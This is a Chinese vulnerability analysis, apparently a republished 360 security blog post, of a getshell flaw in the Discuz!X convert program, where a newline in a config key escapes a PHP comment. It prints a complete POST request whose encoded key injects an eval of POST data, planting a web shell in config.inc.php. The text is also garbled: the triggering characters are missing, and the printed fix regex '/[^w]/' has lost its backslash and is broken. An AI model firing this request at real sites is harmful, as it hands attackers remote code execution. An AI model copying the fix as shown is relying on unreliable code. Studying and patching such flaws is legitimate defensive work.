# Discuz!X升级/转换程序GETSHELL漏洞分析

0x01 漏洞分析
---------

* * *

漏洞的根源在代码注释中出现换行，导致代码执行，流程如下:

### 0x0101 首先，从 index.php第30行跟入。

![enter image description here](http://drops.javaweb.org/uploads/images/b64e0f65627549cb9f74ed6a25e0de7b7215326c.jpg)

### 0x0102 do_config_inc.php的第37行，跟入这个save_config_file()函数。

![enter image description here](http://drops.javaweb.org/uploads/images/bff5f77c893d7f71058e2baffb8bf460c5e80a6a.jpg)

### 0x0103 gobal.func.php第624行，跟入这个getvars()函数。

![enter image description here](http://drops.javaweb.org/uploads/images/bc39233b90789df22577ad0daf345ff221dd9cb7.jpg)

### 0x0104 继续跟入buildarray()这个函数

![enter image description here](http://drops.javaweb.org/uploads/images/de3225c93798d885e59a44eb6d51990b9da86d58.jpg)

### 0x0105 漏洞出现在598行，这个$newline的问题。

![enter image description here](http://drops.javaweb.org/uploads/images/0d28bd612719335b3b9f4e61457c87f324fade5d.jpg)

这里因为$key可控，所以$newline可控，当$newline出现 或 时，导致BBB可以作为php代码执行。如图所示。

![enter image description here](http://drops.javaweb.org/uploads/images/86b98b90a384fecb71892a6b1fac421b240b2ce4.jpg)

0x02 漏洞利用
---------

* * *

可以构造如下请求：

```
POST /DZ2/convert/ HTTP/1.1
Host: 192.168.52.129
Proxy-Connection: keep-alive
Content-Length: 925
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Origin: null
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip,deflate,sdch
Accept-Language: zh-CN,zh;q=0.8

a=config&source=d7.2_x2.0&submit=yes&newconfig%5Btarget%5D%5Bdbhost%5D=localhost&newconfig%5Baaa%0D%0A%0D%0Aeval%28CHR%28101%29.CHR%28118%29.CHR%2897%29.CHR%28108%29.CHR%2840%29.CHR%2834%29.CHR%2836%29.CHR%2895%29.CHR%2880%29.CHR%2879%29.CHR%2883%29.CHR%2884%29.CHR%2891%29.CHR%2899%29.CHR%2893%29.CHR%2859%29.CHR%2834%29.CHR%2841%29.CHR%2859%29%29%3B%2F%2F%5D=localhost&newconfig%5Bsource%5D%5Bdbuser%5D=root&newconfig%5Bsource%5D%5Bdbpw%5D=&newconfig%5Bsource%5D%5Bdbname%5D=discuz&newconfig%5Bsource%5D%5Btablepre%5D=cdb_&newconfig%5Bsource%5D%5Bdbcharset%5D=&newconfig%5Bsource%5D%5Bpconnect%5D=1&newconfig%5Btarget%5D%5Bdbhost%5D=localhost&newconfig%5Btarget%5D%5Bdbuser%5D=root&newconfig%5Btarget%5D%5Bdbpw%5D=&newconfig%5Btarget%5D%5Bdbname%5D=discuzx&newconfig%5Btarget%5D%5Btablepre%5D=pre_&newconfig%5Btarget%5D%5Bdbcharset%5D=&newconfig%5Btarget%5D%5Bpconnect%5D=1&submit=%B1%A3%B4%E6%B7%FE%CE%F1%C6%F7%C9%E8%D6%C3

```

发送这段请求直接getshell，恶意代码写入/convert/data/config.inc.php文件当中，如图所示。

![enter image description here](http://drops.javaweb.org/uploads/images/9caa2542738a65e5a046e4182b7574019eb351d6.jpg)

0x03 关于修复
---------

* * *

需要在global.func.php文件的buildarray函数中过滤掉$key中的非字母、数字及下划线字符，即添加代码如下：

```
$key = preg_replace("/[^w]/","", $key);

```

如图所示。

![enter image description here](http://drops.javaweb.org/uploads/images/9e2f76f6351411e0da174ea7f4596fdc9631428d.jpg)

（以上分析仅供学习交流，各DZ！X系列站长勿忘修复！）

以上为360网站安全中心博客文章，原文：[http://loudong.360.cn/blog/view/id/15](http://loudong.360.cn/blog/view/id/15)